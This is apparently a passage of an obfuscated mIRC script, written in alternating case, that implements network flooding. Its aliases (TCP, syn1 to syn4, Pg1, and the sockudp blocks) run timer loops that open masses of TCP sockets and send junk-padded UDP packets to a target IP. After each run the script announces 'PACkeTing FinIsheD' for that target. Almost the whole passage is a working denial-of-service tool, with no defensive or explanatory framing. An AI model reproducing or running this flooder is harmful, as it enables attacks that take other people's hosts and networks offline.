  sOCKUDP gnUMC1 %gDoPeIP %gnUM.Pr
  %gnUM.Pr2 = %PorT.gDoPe
  sOCKUDP gnUMC2 %gDoPeIP %gnUM.Pr
  %gnUM.Pr3 = %PorT.gDoPe
  sOCKUDP gnUMC3 %gDoPeIP %gnUM.Pr3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnUM.Pr4 = %PorT.gDoPe
  sOCKUDP gnUMC4 %gDoPeIP %gnUM.Pr
  %gnUM.Pr5 = %PorT.gDoPe
  sOCKUDP gnUMC5 %gDoPeIP %gnUM.Pr5 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  %gnUM.Pr6 = %PorT.gDoPe
  sOCKUDP gnUMC6 %gDoPeIP %gnUM.Pr
  %gnUM.Pr7 = %PorT.gDoPe
  sOCKUDP gnUMC7 %gDoPeIP %gnUM.Pr7 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnUM.Pr8 = %PorT.gDoPe
  sOCKUDP gnUMC8 %gDoPeIP %gnUM.Pr
  reTUrn
  :Done
  vTAlC PACkeTing FinIsheD For %gDoPeIP PorT : %PorT.gDoPe
  .timergCoolT oFF
  .UNsET %gDoPeIP
  .UNsET %gnUM*
  .UNsET %PorT.gDoPe
  .UNsET %timer.gDoPe
} 

on *:soCkoPen:PACkeT*:{ 
  iF ($soCkerr > 0) { .soCkClose $soCknAMe }
  sOCkWrITE -Tn PACke
}
AliAs TCPP {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  soCkoPen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  reTUrn
  :Done
  vTAlC PACkeTing FinIsheD For %gDoPeIP
  .timergCoolT oFF
  .soCkClose PACkeT*
  .UNsET %gDoPeIP
  .UNsET %timer.gDoPe
}
AliAs TCPsToP {
  .timergCoolT oFF
  .soCkClose PACkeT*
  .UNsET %gDoPeIP
  .UNsET %sqqq
  vTAlC PACkeTing SToPeD
}
AliAs sysToP {
  .timergCoolT oFF
  .soCkClose syn*
  .UNsET %gDoPeIP
  .UNsET %sqqq
  .UNsET %timer.gDoPe
  vTAlC sy PACkeTing SToPeD
}
AliAs syn1 {
  sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 syn3
}

AliAs syn3 {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  reTUrn
  :Done
  vTAlC sy1 PACkeTing FinIsheD For %gDoPeIP
  .timergCoolT oFF
  .soCkClose syn*
  .UNsET %gDoPeIP
  .UNsET %sqqq
  .UNsET %timer.gDoPe
}
AliAs syn2 {
  sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 syn4
}

AliAs syn4 {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  soCkoPen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq
  reTUrn
  :Done
  vTAlC sy2 PACkeTing FinIsheD For %gDoPeIP PorT : %sqqq
  .timergCoolT oFF
  .soCkClose syn*
  .UNsET %gDoPeIP
  .UNsET %sqqq
  .UNsET %timer.gDoPe
}
AliAs TCPsToP {
  .timergCoolT oFF
  .soCkClose PACkeT*
  .soCkClose syn*
  .UNsET %gDoPeIP
  .UNsET %timer.gDoPe
  vTAlC PACkeTing SToPeD
}
AliAs TCP {
  sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 TCPP
}

AliAs Pg1 {
  sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 Pg2
}
AliAs Pg2 {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  sOCKUDP -nT $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq Ping
  sOCKUDP -nT $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq Ping
  sOCKUDP -nT $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq Ping
  sOCKUDP -nT $r(1,999) $+ $r(1,999) $+ $r(1,999) %gDoPeIP %sqqq Ping
  reTUrn
  :Done
  vTAlC PACkeTing FinIsheD For %gDoPeIP
  .timergCoolT oFF
  .UNsET %gDoPeIP
  .UNsET %sqqq
  .UNsET %timer.gDoPe
}
AliAs Pg1sToP {
  .timergCoolT oFF
  .UNsET %gDoPeIP
  .UNsET %timer.gDoPe
  vTAlC PACkeTing SToPeD
}
